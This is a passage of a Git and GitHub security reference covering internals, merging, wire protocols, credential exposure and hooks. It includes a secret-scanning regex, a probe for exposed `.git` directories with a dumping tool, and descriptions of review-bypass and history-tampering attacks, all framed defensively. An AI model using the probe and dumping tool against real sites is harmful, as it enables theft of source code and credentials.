# Git & GitHub — Deep Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Reference
> **Audience:** Security Engineers, AppSec, DevSecOps, GRC/IT Auditors, Interview Candidates
> **Scope:** Complete, mechanics-first breakdown of Git internals and GitHub platform security — object model, refs, merge algorithms, wire protocols, authentication, signing, secret leakage, and supply chain attack paths
> **Companion:** [`git_github_field_manual.html`](./git_github_field_manual.html) — the same material as an illustrated study guide with 14 vector diagrams

---

## Table of Contents

1. [Why Version Control Exists](#1-why-version-control-exists)
2. [Git Is Not GitHub](#2-git-is-not-github)
3. [The Object Database](#3-the-object-database)
4. [Hashing, SHA-1 and SHA-256](#4-hashing-sha-1-and-sha-256)
5. [The Three Trees](#5-the-three-trees)
6. [Refs, HEAD and the Reflog](#6-refs-head-and-the-reflog)
7. [Branching and Merging](#7-branching-and-merging)
8. [Rebase and Rewriting History](#8-rebase-and-rewriting-history)
9. [Remotes and Wire Protocols](#9-remotes-and-wire-protocols)
10. [The Daily Command Set](#10-the-daily-command-set)
11. [Ignore Rules, Attributes and Hooks](#11-ignore-rules-attributes-and-hooks)
12. [Submodules, Subtrees, LFS and Worktrees](#12-submodules-subtrees-lfs-and-worktrees)
13. [GitHub: Forks and Pull Requests](#13-github-forks-and-pull-requests)
14. [GitHub Actions](#14-github-actions)
15. [Authentication, Tokens and Blast Radius](#15-authentication-tokens-and-blast-radius)
16. [Branch Protection, Rulesets and CODEOWNERS](#16-branch-protection-rulesets-and-codeowners)
17. [Commit Signing and Provenance](#17-commit-signing-and-provenance)
18. [Secrets in History](#18-secrets-in-history)
19. [Supply Chain Attacks](#19-supply-chain-attacks)
20. [Hardening Checklists](#20-hardening-checklists)
21. [Forensics and Audit Evidence](#21-forensics-and-audit-evidence)
22. [Recovery Playbook](#22-recovery-playbook)
23. [Command Reference](#23-command-reference)
24. [Glossary, Drills and Interview Questions](#24-glossary-drills-and-interview-questions)

---

## 1. Why Version Control Exists

Every VCS answers one question: when several people change the same files over time, how do you
reconstruct any past state, understand who changed what, and combine changes without losing either?

### The three generations

```
1 · LOCAL (RCS, SCCS)          2 · CENTRALIZED (CVS, SVN)      3 · DISTRIBUTED (Git, Hg)
┌──────────────────┐           ┌──────────────────┐            ┌──────────────────┐
│ one workstation  │           │  central server  │            │      origin      │
│ ┌──────────────┐ │           │ THE ONLY HISTORY │            │ a peer by        │
│ │working files │ │           └────────┬─────────┘            │ convention       │
│ └──────┬───────┘ │             ┌──────┼──────┐               └───┬──────────┬───┘
│        v         │             │      │      │                   │          │
│ ┌──────────────┐ │           ┌─v─┐  ┌─v─┐  ┌─v─┐             ┌───v────┐ ┌───v────┐
│ │  version db  │ │           │ A │  │ B │  │ C │             │clone A │ │clone B │
│ └──────────────┘ │           └───┘  └───┘  └───┘             │FULL    │ │FULL    │
└──────────────────┘           every commit = network call     │HISTORY │ │HISTORY │
no sharing at all              SINGLE POINT OF FAILURE         └────────┘ └────────┘
disk dies = history dies       clients hold 1 revision          all ops offline
                                                                every clone = backup
```

**The architectural move that defines Git:** history stops living in one privileged place. Every
clone is a complete, independently verifiable copy.

**Security consequence, both directions:**
- Resilient to server loss; fast offline; every clone is a backup.
- A leaked secret spreads to every laptop that ever cloned. You can never truly delete published history.

### What a VCS must provide

| Property | Meaning |
|---|---|
| Reconstruction | Restore the exact whole-project state at any past point |
| Attribution | Who changed which line, when, with what stated reason |
| Concurrency | Two people editing simultaneously with a defined combine procedure |
| Isolation | Work in progress that does not destabilise the shared line |
| Integrity | Detect accidental corruption **and** deliberate tampering |

> **Security framing:** version control is a *system of record for the code that becomes production*.
> That makes it an integrity control, an audit trail, and a high-value target simultaneously. An
> attacker who can write to your default branch does not need a production exploit — they will be
> deployed by your own pipeline, through your own change process.

---

## 2. Git Is Not GitHub

| Dimension | Git | GitHub / GitLab / Bitbucket |
|---|---|---|
| What it is | Open-source local program managing a content-addressed DB in `.git` | Hosted product *around* Git: identity, permissions, review, automation |
| Created | 2005, Linus Torvalds (after BitKeeper's licence withdrawal) | 2008; Microsoft acquired 2018 |
| Identity | **None.** `user.name`/`user.email` are arbitrary local strings | Accounts, MFA, SSO, tokens, audit logs |
| Authorization | Whatever filesystem + transport allow | Roles, teams, branch protection, rulesets, CODEOWNERS |
| Code review | Not a concept (`git request-pull` just formats email) | Pull requests, required approvals, merge queues |
| Automation | Local hooks only; **not** transferred by clone | Actions/Pipelines: server-side CI/CD holding secrets |
| Attack surface | Parser bugs, hook execution, protocol handling, credential files | Account takeover, token theft, workflow injection, fork abuse |
| If it disappears | Nothing — it's on every machine | Code survives; issues, PRs, CI history, permissions do not |

**The practical consequence:** almost every control you actually rely on lives on the **platform**,
not in Git. Git will happily let anyone write any history under any name.

> **THREAT — the bypass path.** Controls at the platform's front door don't apply to side doors.
> Watch for: self-hosted mirrors pushing to production, **write-enabled deploy keys** (which bypass
> branch protection entirely), admins with ruleset bypass, CI service accounts excluded from
> required reviews "because the bot needs to push".

---

## 3. The Object Database

Git is a content-addressed key-value store with a VCS interface bolted on. **Four object types.**
Each is stored identically: zlib-compress `header + payload`, hash the *uncompressed* bytes, file it
under that hash. **The hash IS the name.** Identical content anywhere in history is stored once.

| Type | Contains |
|---|---|
| `blob` | Raw file content. No filename, no permissions, no timestamp. Just bytes. |
| `tree` | Directory listing: `mode · type · hash · name`. **Filenames live here.** |
| `commit` | One root tree, zero or more parents, author, committer, message, optional signature |
| `tag` | Annotated tag object: named, described, optionally signed pointer at another object |

### How they fit together

```
commit 7e3d19f ──parent──> commit 8f4a1c2
   │
   └──tree──> tree a91c0d4  (root)
                ├─ 100644 blob c8a71f2  app.py    ──> "contents of app.py"
                ├─ 100644 blob 5e0dd93  README    ──> "contents of README"
                └─ 040000 tree 3fb2e77  lib/
                             ├─ 100644 blob 9d4b0ca  crypto.py
                             └─ 100755 blob 2ff81ae  run.sh   (executable bit)

DEDUPLICATION: if README is untouched next commit, its new tree reuses blob 5e0dd93.
```

**Git does not store diffs. It stores whole snapshots and deduplicates, then *computes* diffs on
demand.** That's why `git log -p` does real work each time and why checking out any historical
commit is cheap.

### Prove it with plumbing

Git splits commands into **porcelain** (daily use) and **plumbing** (low-level, for scripts).

```bash
git init demo && cd demo
echo "hello" > a.txt

git hash-object a.txt
# ce013625030ba8dba906f756967f9e9ca394464a

# reproducible with no Git at all — this IS the formula:
printf 'blob %d\0' $(wc -c < a.txt) | cat - a.txt | sha1sum
# ce013625030ba8dba906f756967f9e9ca394464a  -
#   header = "blob" SP <bytesize> NUL   then raw content

git add a.txt
find .git/objects -type f
# .git/objects/ce/013625030ba8dba906f756967f9e9ca394464a
#   first 2 hex chars = directory, remaining 38 = filename

git cat-file -t ce01362   # blob
git cat-file -p ce01362   # hello
git cat-file -s ce01362   # 6
```

Walk the graph downward by hand — the whole model in six lines:

```bash
git commit -m "first"
git cat-file -p HEAD
# tree 68aba62e560c0ebc3396e8ae9335232cd93a3f60
# author  Jane Dev <jane@corp.example> 1756800000 +0530
# committer Jane Dev <jane@corp.example> 1756800000 +0530
#
# first

git cat-file -p 68aba62
# 100644 blob ce013625030ba8dba906f756967f9e9ca394464a    a.txt

git cat-file -p ce01362
# hello
```

### Plumbing worth knowing

| Command | Use |
|---|---|
| `git cat-file -p <oid>` | Print any object. **Primary forensic tool.** |
| `git cat-file --batch-all-objects --batch-check` | Every object with type+size. Finds the 40MB blob nobody admits to. |
| `git rev-parse <rev>` | Resolve any revision expression to a full OID |
| `git rev-list --objects --all` | Every reachable object with its path. Backbone of history-wide secret scanning. |
| `git ls-tree -r HEAD` | Flatten a tree: modes, hashes, paths |
| `git verify-pack -v` | Inspect a packfile including delta chains |
| `git fsck --full --unreachable` | Integrity-check every object; list unreferenced ones |

### Anatomy of `.git/`

| Path | Contains | Security note |
|---|---|---|
| `objects/` | The store. Loose `ab/cdef…`, plus `pack/*.pack` + `*.idx` | |
| `refs/heads/` | Local branches — **one 40-char hash per file** | |
| `refs/tags/` | Tags | |
| `refs/remotes/` | Last-known remote positions, updated by fetch | |
| `HEAD` | Usually `ref: refs/heads/main`. Raw hash = detached HEAD | |
| `index` | Staging area: binary list of paths, blob hashes, modes, stat data | |
| `config` | Repo-local config incl. remote URLs | **A URL here can embed credentials** |
| `hooks/` | Executable lifecycle scripts | **Code execution.** Not cloned, by design |
| `logs/` | The reflog: every ref movement, timestamped | Local audit trail |
| `packed-refs` | Refs compacted into one file | |
| `info/exclude` | Local-only ignore rules, never committed | |
| `ORIG_HEAD`, `MERGE_HEAD` | Transient operation state | `ORIG_HEAD` is a lifeline after a bad reset/merge |

> **THREAT — `.git` served over HTTP.** If a web server exposes a deployed app's `.git` directory,
> an attacker downloads `.git/objects` and reconstructs your **entire source history**, including
> credentials you removed three commits later.
> **Test:** request `/.git/HEAD`. A body of `ref: refs/heads/main` confirms exposure. `git-dumper`
> automates reconstruction.
> **Fix:** deploy build artifacts not working trees; block dot-directories at the web server; keep
> `.git` outside the document root.

### Loose objects, packfiles, delta compression

New objects are written individually and zlib-compressed. `git gc` periodically rewrites many loose
objects into a **packfile** where similar objects are stored as deltas against one another.

Two security-relevant properties:
1. **Packing does not change object IDs** — the hash names uncompressed content, so integrity survives repacks.
2. **GC is what actually deletes unreachable objects**, and it won't touch anything younger than
   `gc.pruneExpire` (**default two weeks**). That grace period is a recovery safety net *and* an
   incident-response exposure window.

---

## 4. Hashing, SHA-1 and SHA-256

### Why the chain gives tamper evidence

A commit's hash covers its tree hash, parent hashes, author/committer lines and message. The tree's
hash covers every filename, mode and blob hash beneath it. So **one changed byte 3000 commits ago**
changes that blob → its tree → that commit → every descendant commit hash.

This is a **Merkle tree** — the same structure behind certificate transparency logs and blockchains.

```
BEFORE (published chain):
blob 5e0dd93 → tree a91c0d4 → cmt 7e3d19f → cmt b204ae8 → cmt 91fc37d (tip)

Attacker edits one byte in the oldest file and rewrites history:

AFTER (every downstream hash changed):
blob 1c9f04b → tree e37b510 → cmt 4d8e2ff → cmt aa71c60 → cmt 0e5b8d2

Nothing downstream survives. Any clone holding the old tip sees a divergent history
and an unexpected force-push. TAMPERING IS LOUD — provided someone is listening.
```

> **THE LIMIT.** Integrity ≠ authenticity. Nothing above proves *who wrote* any of it. An attacker
> who simply appends a new commit as "Jane Dev" produces a perfectly valid, perfectly intact chain.
> See §17.

### The SHA-1 problem

| Year | Event |
|---|---|
| 2005 | SHA-1 theoretically weakened |
| 2017 | **SHAttered** — first public SHA-1 collision (two PDFs, same digest) |
| 2019–2020 | **Chosen-prefix** collision demonstrated, ~$45k of compute and falling |
| 2020 | Git 2.29 introduces experimental SHA-256 repositories |

A plain *collision* is awkward for Git. A **chosen-prefix collision** is the dangerous kind: craft
two meaningfully different files (benign source vs backdoored) that hash identically. Push the
benign one, get it reviewed and merged, then serve the malicious one to anything fetching by hash.

**Git's mitigation — hardened SHA-1.** Since 2.13 Git uses **SHA-1DC** (collision detection), the
Stevens–Shumow algorithm that detects message-block patterns produced by known collision attacks and
refuses to proceed. SHAttered PDFs fed to modern Git produce an error, not a collision. Strong
against *known* attack families; not a proof against future ones.

**The real fix — SHA-256 repositories:**

```bash
git init --object-format=sha256 newrepo
# object IDs become 64 hex chars instead of 40
```

> **PITFALL — interoperability.** SHA-256 repos cannot interoperate with SHA-1 repos. You cannot
> push a SHA-256 repo to a SHA-1 remote, and **GitHub does not host SHA-256 repositories** as of
> today. The planned interop layer (keeping both hashes per object) is unfinished. Treat SHA-256 as
> production-ready only for self-contained repos on infrastructure you control.

**What to actually do:**
- Keep Git current (SHA-1DC + years of parser hardening).
- Never build a control whose only assumption is "SHA-1 is collision-resistant".
- Use signed commits and signed tags for anything you distribute.
- Publish SHA-256 checksums alongside release artifacts, and sign the checksum file.

---

## 5. The Three Trees

```
  WORKING TREE              INDEX (staging)            HEAD COMMIT
  files you edit            .git/index                 refs/heads/<branch>
  ordinary filesystem       a COMPLETE proposed tree   last committed tree
        │                          │                          │
        │──────── git add ────────>│──────  git commit ──────>│
        │<──── git restore ‹f› ────│<─── git restore --staged ─│
        │                          │                          │
        │<═══════════ git reset --hard ‹c›  ·  git switch ‹b› ═╡  (overwrites ALL THREE)

  |◄──── git diff ────►|◄─ git diff --staged ─►|
  |◄──────────────── git diff HEAD ────────────►|
```

**The index is not a list of changed files.** It is a complete snapshot of the entire project that
Git turns into a tree object at commit time. That's why `git add` of one file still produces a commit
containing every other file unchanged — and why staging is a real review surface.

### Reset modes

| Command | Moves branch ref | Rewrites index | Rewrites working tree | Use when |
|---|:--:|:--:|:--:|---|
| `git reset --soft <c>` | yes | no | no | Squashing last few commits. Changes stay staged. |
| `git reset --mixed <c>` | yes | yes | no | Default. Undo commit + staging, keep edits. |
| `git reset --hard <c>` | yes | yes | **yes** | You want edits gone. **Uncommitted work is unrecoverable.** |

> **PITFALL — the one thing Git cannot recover.** Committed work is almost always recoverable via
> the reflog, even after a hard reset. **Uncommitted work is not.** `git reset --hard`,
> `git checkout .` and `git clean -fd` destroy changes that were never turned into objects. When in
> doubt, `git stash` first — a stash is a real commit.

### Staging with intent

```bash
git add -p              # interactive hunk-by-hunk staging — read your own diff
git add -N <file>       # record a new file's existence so it appears in git diff
git restore --staged .  # unstage everything, keep edits
git status --short      # XY format: X = index state, Y = working tree state
git diff --staged       # review exactly what you are about to commit
```

> **HABIT THAT PREVENTS MOST SECRET LEAKS.** Use `git add -p` + `git diff --staged` rather than
> `git add .`. The overwhelming majority of credential leaks are accidental: a `.env`,
> `terraform.tfstate`, `kubeconfig`, service-account JSON or IDE settings file swept up by a bulk
> add. Reading your own staged diff costs seconds and catches nearly all of them.

---

## 6. Refs, HEAD and the Reflog

A branch is a 40-byte text file.

```bash
cat .git/refs/heads/main
# 7e3d19f8c2a1b4e0d6f39a5c7b2e18d0a4c96f31

cat .git/HEAD
# ref: refs/heads/main     ← a symbolic ref: HEAD points at a branch

# the reference hierarchy
refs/heads/<name>              # local branches
refs/tags/<name>               # tags
refs/remotes/<remote>/<name>   # remote-tracking, updated by fetch
refs/notes/, refs/stash, refs/pull/<n>/head    # notes, stash, GitHub PR refs
```

### Attached vs detached HEAD

```
ATTACHED (normal)                      DETACHED
HEAD ──symref──> refs/heads/main       HEAD = 4ac82e5   (raw hash, no branch)
                        │                       │
   A <── B <── C <──────┘                A <── B <── C <┘
                    ╎                                ╎
                    D  (new commit)                  D  (new commit)

git commit → main advances to D,       git commit → HEAD moves to D but NO REF
HEAD follows. D is reachable.          records it. `git switch main` and D is
Nothing can be lost.                   unreachable. Only the reflog can find it.
```

Detached HEAD is **not an error state** — it's how `git bisect`, `git rebase` and checking out a tag
work internally. It's dangerous only because commits made there are referenced by nothing, and
unreferenced objects are eventually collected. Fix: `git switch -c rescue-branch`.

### The reflog — your local audit trail

```bash
git reflog
# 7e3d19f HEAD@{0}: commit: add rate limiting
# b204ae8 HEAD@{1}: reset: moving to HEAD~1
# 91fc37d HEAD@{2}: rebase (finish): returning to refs/heads/main
# 4ac82e5 HEAD@{3}: checkout: moving from main to feature/otp

git reflog show main       # history of ONE branch pointer
git reflog --date=iso      # absolute timestamps — what you want for forensics

# recover a deleted branch or a reset-away commit
git switch -c recovered 91fc37d
git reset --hard main@{2}
```

> **FORENSIC VALUE.** The reflog answers what the commit graph cannot: *when did this clone first
> see this commit*, *was there a force-push*, *did someone reset a branch backwards*. During an
> investigation on a developer workstation, **capture `.git/logs/` before anything else** —
> `gc.reflogExpire` defaults to **90 days** (reachable) / **30 days** (unreachable), and any Git
> command may trigger expiry.

> **PITFALL — the reflog does not exist on the server.** Bare repos typically have reflogs disabled
> (`core.logAllRefUpdates` defaults false for bare). GitHub keeps its own audit trail instead,
> exposed via the org audit log and Events API — **not** through Git. Do not plan an investigation
> around reflog data you have not confirmed exists.

### Revision syntax

| Syntax | Meaning |
|---|---|
| `HEAD~3` | Three back, always following the **first** parent |
| `HEAD^2` | The **second** parent of a merge. `^` picks *which* parent, `~` picks *how far* |
| `main@{2}` | Where `main` pointed two reflog entries ago |
| `main@{yesterday}` | Where `main` pointed at that time, by reflog |
| `A..B` | Reachable from B but not A — the default "what's new" range |
| `A...B` | Symmetric difference — what `git log --left-right` shows |
| `:/fix login` | Most recent commit whose message matches |
| `HEAD:path/to/file` | The blob at that path in that commit |

---

## 7. Branching and Merging

```bash
git switch -c feature/otp     # create + switch (modern)
git checkout -b feature/otp   # same, older form
git branch -vv                # branches, upstreams, ahead/behind
git branch -d feature/otp     # delete only if merged
git branch -D feature/otp     # delete regardless — commits survive in reflog
git switch -                  # back to previous branch
```

### Two kinds of merge

```
A · FAST-FORWARD — main has not moved since the branch was created
       main                      feature
        │                           │
   A <── B <── C <── D              git merge feature
                                    → main just MOVES to D. No commit created.
                                    → history stays linear; branch leaves no trace
   --no-ff FORCES a merge commit. Many teams require it so every merge is auditable.

B · THREE-WAY MERGE — both sides moved, a new commit is unavoidable
              ours (main)
   A <── B <── E ◄────────┐
         ▲                 │
      merge base        ┌──M  merge commit (2 parents)
         │                 │
         C <── D ◄─────────┘
           theirs (feature)

git merge-base main feature  → B
Per file: compare base→ours and base→theirs.
Non-overlapping changes combine silently. Overlapping = conflict for a human.
```

**The merge base is the whole trick.** Git compares **two sets of changes against a shared
ancestor**, not two file versions — which is why it combines edits to different parts of the same
file without asking. Default strategy is now `ort` (replacing `recursive`), better at renames and
criss-cross merges.

### Resolving conflicts

```
<<<<<<< HEAD
timeout = 30            # ours — the branch you are merging INTO
=======
timeout = 60            # theirs — the branch being merged IN
>>>>>>> feature/otp
```

```bash
git config merge.conflictStyle zdiff3   # ALSO show the base version — do this
git status                    # "both modified" lists conflicts
git checkout --ours  <file>   # take our side wholesale
git checkout --theirs <file>  # take their side wholesale
git add <file>                # staging a file marks it resolved
git merge --continue
git merge --abort             # back to pre-merge state, always safe
git config rerere.enabled true  # remember conflict resolutions and replay them
```

> **THREAT — the conflict-resolution blind spot.** On GitHub the PR diff is normally the change
> against the merge base. **A merge commit's own content is not reviewed the same way.** If a
> developer resolves a conflict by hand, the resolution can introduce code present in *neither
> parent* that no reviewer saw. This is a genuine, repeatedly exploited way to smuggle changes past
> review.
> **Detection:** `git log --cc --merges` shows a combined diff revealing content unique to the merge
> commit. Also `git diff HEAD^1 HEAD` and `git diff HEAD^2 HEAD`. Requiring linear history, or a
> merge queue that re-runs checks on the final result, removes the class entirely.

### Merge strategies

| Flag | Effect |
|---|---|
| `--no-ff` | Always create a merge commit, preserving that a branch existed |
| `--squash` | Combine branch work into one commit, no merge link. Clean history, lost granularity, branch shows unmerged |
| `-X ours` / `-X theirs` | Auto-resolve conflicting hunks preferring one side |
| `-s ours` | Record a merge but **discard the other side's changes entirely**. Dangerous if misunderstood |
| `--verify-signatures` | Refuse to merge unless commits are validly signed. Underused |

---

## 8. Rebase and Rewriting History

Rebase does not move commits — it *cannot*, commits are immutable. It **replays** changes as brand
new commits with new hashes, then abandons the originals.

```
START                    git merge feature              git rebase main
  main                     main + merge M                 linear, new objects
A<─B<─E                  A<─B<─E<──┐                    A<─B<─E<─C'<─D'
   ▲                        ▲       M                          (NEW HASHES)
   C<─D                     C<─D<───┘                    C, D orphaned → reflog only
   feature

NOTHING rewritten.                                       C' and D' are NEW objects:
C and D keep hashes,                                     same patch, different hash,
signatures, timestamps.                                  new committer timestamp,
History records the branch                               AND ANY SIGNATURE IS STRIPPED.
existed and when it landed.                              Branch existence is erased.
```

**The trade-off is real, not stylistic: merge preserves evidence; rebase preserves readability.**
For regulated or security-sensitive repositories evidence usually wins — a signed commit that
survives to the default branch is worth more than a tidy log.

### Interactive rebase

```bash
git rebase -i HEAD~5      # edit the last five commits
git rebase -i --root      # rewrite from the very first commit

# the todo list, one line per commit:
pick   4ac82e5 add otp endpoint
reword 91b0f7d fix typo in ottp          # change message only
squash 7e3d19f address review comments   # fold into previous commit
fixup  b204ae8 lint                      # squash but discard this message
edit   d15c6ae add secret key            # stop here so you can amend content
drop   0e5b8d2 debug printf              # remove entirely

git rebase --continue | --skip | --abort
git commit --amend                              # rewrite only the most recent commit
git rebase --onto main old-base feature         # transplant a range onto a new base
```

> **THE GOLDEN RULE, AND ITS REAL REASON.** Do not rebase commits others have based work on. Because
> rebase produces *new objects*, everyone who already fetched the old ones now has divergent history.
> Their next pull tries to merge old and new lines, producing duplicated commits and inexplicable
> conflicts.
> When you must force-push, use `--force-with-lease` not `--force` — lease checks the remote ref is
> still where you last saw it, so you cannot silently destroy a colleague's commit. Better still,
> `--force-with-lease --force-if-includes`.

> **THREAT — history rewriting as anti-forensics.** An attacker with push access to an unprotected
> branch can drop the commit that added a backdoor, amend a commit so a malicious change appears
> under a colleague's name, or forge author dates so activity falls outside a review window. Because
> **rebase strips signatures by default**, a rewritten history also quietly loses whatever
> cryptographic attribution existed.
> **Controls:** deny force-push on protected branches *including admins*; enable "block force pushes"
> rulesets; require signed commits so rewritten commits fail verification; alert on force-push audit
> events — on a protected branch they should be impossible.

### Cherry-pick and revert

```bash
git cherry-pick <commit>       # replay one commit here, as a NEW object
git cherry-pick -x <commit>    # append "(cherry picked from …)" — do this for traceability
git cherry-pick A..B           # a range

git revert <commit>            # NEW commit that undoes it — SAFE on shared branches
git revert -m 1 <merge-commit> # revert a merge, keeping mainline parent 1
```

`revert` is the only undo safe on published history because it **adds** rather than rewrites. For
anything pushed to a shared branch, reach for `revert` first; treat rewriting as an incident-response
action requiring coordination.

---

## 9. Remotes and Wire Protocols

```
   LOCAL                                              REMOTE
┌───────────────────────┐                     ┌──────────────────────┐
│ refs/remotes/origin/* │◄──── git fetch ─────│ origin (bare repo)   │
│ read-only cache of    │  downloads objects, │ refs/heads/main      │
│ the server's position │  moves origin/* ONLY│ refs/heads/release   │
└──────────┬────────────┘  never touches your │ objects/ (packed)    │
           │ git merge     branch/working tree│ NO WORKING TREE      │
           │ git rebase                       └──────────▲───────────┘
┌──────────▼────────────┐                                │
│ refs/heads/main       │───────── git push ─────────────┘
│ + working tree        │  uploads objects, asks server to move its ref
└───────────────────────┘  server may refuse: non-fast-forward, hooks, branch protection

   git pull = git fetch + integrate

TRANSPORT:
  ssh://git@host:repo   ✅ key auth, encrypted, host key pins the server
  https://host/repo.git ✅ TLS + token/helper, works through proxies
  git://host/repo.git   ❌ NO auth, NO encryption, NO integrity — never use
  file:/// and /path    ⚠️  hardlinks objects; trust == filesystem trust
```

`fetch` is the only network command that cannot surprise you. Everything painful about `pull` comes
from the integrate step it hides. `pull.ff only` turns silent surprise merges into an explicit error.

### Remotes and refspecs

```bash
git remote -v
git remote add upstream https://github.com/original/api.git
git remote show origin        # branches, tracking, and what push would do
git remote prune origin       # drop remote-tracking refs for deleted branches

# a refspec is  +<src>:<dst>   — the + means "allow non-fast-forward"
fetch = +refs/heads/*:refs/remotes/origin/*

# GitHub exposes PRs as fetchable refs:
git fetch origin +refs/pull/*/head:refs/remotes/origin/pr/*
git switch --detach origin/pr/42     # review PR 42 locally
```

### What happens on the wire

Both SSH and HTTPS run the same **smart protocol**, in three phases:

1. **Reference discovery** — server advertises every ref + OID and its capabilities. Over HTTPS:
   `GET /info/refs?service=git-upload-pack`.
2. **Negotiation** — client sends `want` lines for needed objects and `have` lines for held ones;
   both sides converge on a minimal set. **Protocol v2** (default since 2.26) lets the client filter
   refs server-side instead of receiving the entire advertisement — enormous on repos with tens of
   thousands of refs.
3. **Packfile transfer** — server streams a packfile of only the missing objects; client verifies and
   indexes it.

```bash
GIT_TRACE_PACKET=1 git fetch origin        # watch the protocol conversation
GIT_TRACE=1 GIT_CURL_VERBOSE=1 git fetch   # full HTTP debugging
git config --global protocol.version 2

# restrict which transports Git will ever use
git config --global protocol.allow never
git config --global protocol.https.allow always
git config --global protocol.ssh.allow always
```

> **THREAT — transport and credential exposure**
> - **`git://` has no authentication, no encryption, no server verification.** Anyone on the path can
>   serve arbitrary code. GitHub disabled it in 2022. Finding it in a Dockerfile, submodule URL or
>   manifest is a finding.
> - **Credentials in remote URLs** (`https://user:token@github.com/…`) write the token into
>   `.git/config` in plaintext, into every `git remote -v`, and often into CI logs.
> - **`~/.git-credentials` is plaintext by design.** The `store` helper is unencrypted
>   `https://user:password@host` lines. Prefer `osxkeychain`, `wincred`/`manager`, `libsecret`, or
>   `cache` with a short timeout.
> - **SSH host key verification is your only MITM defence.** Typing "yes" to an unknown fingerprint
>   defeats it. Pre-seed `known_hosts`; set `StrictHostKeyChecking yes` in CI images.
> - **`http.sslVerify=false`** appears in countless internal CI configs to work around a proxy. It
>   converts HTTPS into `git://` with extra steps.

### Safe global defaults

```bash
git config --global pull.ff only              # never a surprise merge commit
git config --global push.default simple
git config --global transfer.fsckObjects true
git config --global fetch.fsckObjects true
git config --global receive.fsckObjects true  # reject malformed/malicious objects
git config --global init.defaultBranch main
git config --global credential.helper manager
```

`fsckObjects` is the underrated one: it validates the structure of every received object and has
blocked several real object-parsing exploits.

---

## 10. The Daily Command Set

**Starting**
```bash
git init                            # create .git here
git init --bare shared.git          # server-side repo: no working tree
git clone <url> [dir]
git clone --depth 1 <url>           # shallow: latest commit only
git clone --filter=blob:none <url>  # blobless partial clone: full graph, blobs on demand
git clone --single-branch --branch release <url>
```

**Recording**
```bash
git status -sb
git add -p                     # stage interactively — read every hunk
git commit -m "msg"
git commit -v                  # show staged diff in the editor while writing the message
git commit --amend --no-edit   # fold staged changes into the last commit
git commit --fixup <sha>       # marked for autosquash
git rebase -i --autosquash <base>
```

**Inspecting**
```bash
git log --oneline --graph --decorate --all
git log -p -- path/to/file
git log --follow -- file            # keep tracking across renames
git log -S "AWS_SECRET"             # pickaxe: commits changing the COUNT of this string
git log -G "regex"                  # commits whose diff TEXT matches this regex
git log --author="jane" --since="2 weeks"
git log --diff-filter=D -- path     # when was this file deleted, and by whom
git show <commit>:path/to/file      # the file's contents at that commit
git blame -w -C -C <file>           # ignore whitespace, detect moved/copied code
git shortlog -sn
git bisect start / bad / good
git bisect run ./test.sh            # fully automated
```

> **THE PICKAXE IS A SECURITY TOOL.** `git log -S` is the fastest way to answer "when did this
> string enter the repository and when did it leave". Run it against a leaked credential fragment, a
> suspicious domain, a base64 blob, or an unfamiliar function name. Add `--all` for every ref.
> `git log -G` is the regex sibling and catches changes that keep the occurrence count the same.

**Undoing**
```bash
git restore <file>                     # discard working-tree changes
git restore --staged <file>            # unstage
git restore --source=HEAD~3 <file>
git revert <commit>                    # safe undo on shared history
git reset --soft|--mixed|--hard <c>
git clean -nd                          # DRY RUN first, always
git clean -fd
git stash push -m "wip" -u             # -u includes untracked files
git stash list / show -p / pop / drop
```

**Sharing**
```bash
git fetch --all --prune --tags
git pull --rebase
git push -u origin feature/otp
git push --force-with-lease            # the only acceptable force
git push origin --delete old-branch
git push --tags                        # tags are NOT pushed by default
```

> **PITFALL — three surprising defaults**
> - **Tags do not push automatically.** A release tag existing only locally will confuse everyone.
> - **Empty directories cannot be tracked.** Git tracks files. Convention: add a `.gitkeep`.
> - **File modes are barely tracked.** Only the executable bit (`100644` vs `100755`). No ownership,
>   no full permissions — do not use Git as a deployment mechanism that must preserve them.

---

## 11. Ignore Rules, Attributes and Hooks

### .gitignore layers

| Layer | Scope |
|---|---|
| `.gitignore` | Committed, shared. Belongs to the project |
| `.git/info/exclude` | Local to your clone, never committed |
| `core.excludesFile` | Global across all repos (`~/.gitignore_global`) |
| Subdirectory `.gitignore` | Applies from that directory downward |

```gitignore
*.log            # any .log anywhere
/build           # only at repository root
build/           # any directory named build
!important.log   # negation: re-include
doc/**/*.pdf     # ** crosses directory boundaries
```

```bash
git check-ignore -v path/to/file   # WHICH rule is ignoring this? invaluable
git status --ignored
git rm --cached <file>             # stop tracking without deleting from disk
```

> **THREAT — `.gitignore` is not a security control.**
> 1. **Ignore rules do not apply to already-tracked files.** Adding `.env` to `.gitignore` after
>    committing it changes nothing — the file keeps being tracked and every future change is
>    committed. You need `git rm --cached .env` too, and the old content is still in history forever.
> 2. **An ignored file is invisible to review but present on disk.** Attackers rely on this: a
>    malicious build script at an ignored path, or a `.gitignore` entry added in the same PR that
>    adds the file it hides. Read `.gitignore` changes in security-relevant PRs — don't skim them.

### .gitattributes

```gitattributes
* text=auto                      # normalise line endings to LF in the repo
*.sh   text eol=lf
*.png  binary                    # never diff or merge as text
secrets.yaml filter=git-crypt diff=git-crypt
config/prod.json merge=ours      # custom merge driver
package-lock.json -diff          # hide from diffs — see warning
```

> **PITFALL — attributes can hide changes from reviewers.** `-diff` and `linguist-generated=true`
> collapse a file in GitHub's diff view. Convenient for lockfiles, lethal for review: a PR can modify
> a suppressed file and the change hides behind a "load diff" nobody clicks. If you suppress a file,
> ensure something else (dependency review, a CODEOWNERS entry) still forces a human to look.

### Hooks

Two facts define their posture: **hooks are not transferred by clone**, and **hooks run with your
user's privileges**.

| Hook | Runs | Blocks? | Typical use |
|---|---|:--:|---|
| `pre-commit` | Before the message editor | yes | Secret scanning, lint, format, tests |
| `prepare-commit-msg` | Before editor opens | yes | Inject ticket IDs / templates |
| `commit-msg` | After message written | yes | Enforce conventional commits |
| `pre-push` | Before objects are sent | yes | Last-chance secret scan; block pushes to `main` |
| **`pre-receive`** | **Server side, before refs update** | **yes** | **The real enforcement point.** Signature checks, policy |
| `update` | Server side, per ref | yes | Per-branch authorization |
| `post-receive` | Server side, after update | no | Notifications, trigger deploys |
| `post-checkout` / `post-merge` | Client, after operation | no | Reinstall deps, rebuild |

```bash
# share hooks with the team: commit them, point Git at the directory
git config core.hooksPath .githooks
```

```bash
#!/usr/bin/env bash
# .githooks/pre-commit — minimal secret guard
set -euo pipefail
if git diff --cached --name-only -z | xargs -0 -r grep -nIE \
   'AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----|xox[baprs]-[0-9A-Za-z-]+' ; then
